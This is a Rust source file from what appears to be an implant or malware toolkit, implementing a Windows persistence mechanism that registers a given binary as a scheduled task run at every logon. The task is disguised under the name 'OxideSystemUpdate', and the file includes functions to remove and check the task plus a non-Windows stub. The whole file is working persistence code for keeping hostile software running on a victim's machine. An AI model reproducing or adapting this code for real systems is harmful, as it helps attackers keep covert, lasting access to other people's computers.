use crate::persistence::PersistenceTrait;
use std::path::Path;

pub struct ScheduledTaskPersistence;
const TASK_NAME: &str = "OxideSystemUpdate";

#[cfg(target_os = "windows")]
impl PersistenceTrait for ScheduledTaskPersistence {
    fn install(&self, binary_path: &Path) -> anyhow::Result<()> {
        use std::process::Command;
        let s = binary_path.to_str().ok_or_else(|| anyhow::anyhow!("invalid path"))?;
        // No /rl highest — requires admin, fails for standard users.
        let status = Command::new("schtasks")
            .args(["/create", "/f", "/sc", "onlogon", "/tn", TASK_NAME, "/tr", s])
            .status()?;
        anyhow::ensure!(status.success(), "schtasks /create failed");
        Ok(())
    }
    fn remove(&self) -> anyhow::Result<()> {
        use std::process::Command;
        let s = Command::new("schtasks").args(["/delete", "/f", "/tn", TASK_NAME]).status()?;
        anyhow::ensure!(s.success(), "schtasks /delete failed");
        Ok(())
    }
    fn check(&self) -> bool {
        use std::process::Command;
        Command::new("schtasks").args(["/query", "/tn", TASK_NAME])
            .output().map(|o| o.status.success()).unwrap_or(false)
    }
    fn name(&self) -> &'static str { "scheduled_task" }
}

#[cfg(not(target_os = "windows"))]
impl PersistenceTrait for ScheduledTaskPersistence {
    fn install(&self, _: &Path) -> anyhow::Result<()> {
        anyhow::bail!("scheduled tasks not available on this platform")
    }
    fn remove(&self) -> anyhow::Result<()> { Ok(()) }
    fn check(&self) -> bool { false }
    fn name(&self) -> &'static str { "scheduled_task" }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn task_name_stable() { assert_eq!(TASK_NAME, "OxideSystemUpdate"); }
}
